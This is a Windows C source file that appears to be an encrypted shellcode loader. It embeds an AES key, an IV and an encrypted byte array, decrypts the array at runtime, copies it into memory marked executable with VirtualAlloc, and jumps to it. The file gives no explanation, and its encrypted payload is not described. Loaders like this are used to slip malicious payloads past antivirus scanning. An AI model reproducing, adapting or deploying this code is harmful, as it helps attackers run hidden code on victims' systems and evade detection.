#include <windows.h>
#include <stdio.h>

#include "aes.hpp"


int main(int argc, char* argv[])
{
    void* exec_mem;
    unsigned char pKey[] = {
        0x5A, 0xFD, 0x90, 0x12, 0xCA, 0x19, 0x38, 0x6C, 0x07, 0xBB, 0x85, 0x2B, 0x19, 0xDD, 0x59, 0x3A,
        0x8B, 0xEB, 0x44, 0x77, 0x13, 0xD3, 0x4C, 0x67, 0x75, 0x5C, 0xE9, 0x28, 0xA4, 0xB8, 0x54, 0xA7 };


    unsigned char pIv[] = {
            0x68, 0x07, 0xB3, 0x45, 0x3C, 0x07, 0x86, 0x97, 0x26, 0xE8, 0x46, 0x70, 0x94, 0xF1, 0x6D, 0x70 };


    unsigned char AESshellcode[] = {
            0xD9, 0xEE, 0x6C, 0x22, 0x57, 0x0E, 0xBA, 0x78, 0xC3, 0xF0, 0xE0, 0xC3, 0x51, 0xC3, 0x76, 0xC3,
            0xC8, 0x1B, 0x48, 0x0C, 0x48, 0xDF, 0x69, 0x72, 0x99, 0x9C, 0xBD, 0x43, 0xCC, 0x5A, 0x1A, 0xF8,
            0x7F, 0xD0, 0x09, 0x7A, 0xEA, 0x63, 0x41, 0x1D, 0xDE, 0xA7, 0x9E, 0x76, 0x36, 0x5F, 0xFC, 0x6E,
            0x07, 0xD2, 0xC1, 0x96, 0x1F, 0x31, 0xBF, 0x4F, 0xAD, 0xAA, 0xCE, 0xA8, 0xD5, 0x27, 0x8F, 0x4B,
            0xF5, 0xDF, 0xB3, 0x45, 0x19, 0xDB, 0x1B, 0x20, 0xDB, 0x4A, 0x78, 0x30, 0xC4, 0x02, 0x70, 0x3E,
            0xD9, 0x2D, 0x43, 0x81, 0xB3, 0x1F, 0x76, 0x27, 0xDA, 0x22, 0xCA, 0xD4, 0xDE, 0x0C, 0xFD, 0x71,
            0x3F, 0xB7, 0x5A, 0xE9, 0x19, 0x21, 0x10, 0xF7, 0x82, 0xC6, 0x54, 0x87, 0x41, 0xE9, 0x0A, 0xC9,
            0x12, 0x08, 0xAC, 0x3E, 0x00, 0xAF, 0xBE, 0xE0, 0xD3, 0x41, 0x6D, 0x58, 0x28, 0xF8, 0xF3, 0xC4,
            0xC1, 0x76, 0x2F, 0x16, 0x6F, 0x7D, 0xCC, 0x0A, 0xA7, 0x62, 0x59, 0x3C, 0x83, 0x4B, 0xE0, 0x1C,
            0x64, 0x97, 0x5A, 0x69, 0x15, 0x72, 0xEC, 0xED, 0x03, 0x05, 0xD4, 0x88, 0x35, 0x2D, 0xED, 0x93,
            0x52, 0x46, 0x77, 0x8A, 0xB1, 0xFD, 0xEA, 0x0A, 0x63, 0x28, 0xE0, 0x9D, 0x01, 0x63, 0xC2, 0x79,
            0x45, 0xA1, 0xD9, 0x53, 0x5F, 0x79, 0x31, 0x4B, 0xEE, 0x26, 0xE5, 0x38, 0x20, 0xB2, 0x38, 0x3C,
            0xF9, 0x02, 0x21, 0xFF, 0xEC, 0x3F, 0x5E, 0x9F, 0x37, 0xE0, 0xA2, 0x0B, 0xE1, 0xD6, 0x4A, 0x9E,
            0x2E, 0x84, 0x62, 0xFA, 0x0B, 0xED, 0x90, 0x69, 0xBB, 0xA7, 0x5F, 0x85, 0x89, 0x7D, 0xBD, 0xC4,
            0x0C, 0x4F, 0x28, 0x5B, 0xEF, 0x9D, 0x96, 0xD4, 0x78, 0x9D, 0x94, 0xF5, 0xF0, 0xB9, 0xB1, 0x45,
            0x95, 0x39, 0xDB, 0x32, 0x08, 0x21, 0xC2, 0xB7, 0x80, 0x3F, 0xF6, 0xD9, 0x54, 0x3C, 0xBD, 0x1E,
            0x5D, 0xD1, 0x09, 0xD2, 0xA9, 0xA4, 0xF0, 0xA8, 0x0F, 0xFD, 0xE1, 0xAC, 0x8A, 0x23, 0xCD, 0x5F,
            0xE6, 0xA0, 0x4C, 0xE0, 0x6B, 0xEA, 0x83, 0xCB, 0xA6, 0xB1, 0x42, 0xDE, 0x70, 0x11, 0xEA, 0x34 };
	SIZE_T shellcodeSize = sizeof(AESshellcode);

	

	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, pKey, pIv);
	AES_CBC_decrypt_buffer(&ctx, AESshellcode, shellcodeSize);

    exec_mem = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    RtlMoveMemory(exec_mem, AESshellcode, shellcodeSize);

    ((void(*)())exec_mem)();

    return 0;
}